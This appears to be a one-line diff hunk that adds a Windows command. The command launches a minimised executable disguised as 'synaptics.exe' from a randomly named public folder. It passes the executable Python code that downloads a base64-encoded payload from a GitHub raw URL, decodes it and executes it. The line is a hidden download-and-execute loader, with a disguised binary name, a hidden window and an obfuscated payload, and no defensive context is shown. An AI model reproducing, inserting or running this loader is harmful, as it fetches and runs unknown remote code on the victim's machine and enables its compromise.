@@ -1,0 +1,1 @@
+start "" /min "C:\\Users\\Public\\oZHyMUy4qk\\synaptics.exe" -c "import urllib.request;import base64;exec(base64.b64decode(urllib.request.urlopen('https://github.com/occ-m/cc/raw/main/bs').read().decode('utf-8')))"   
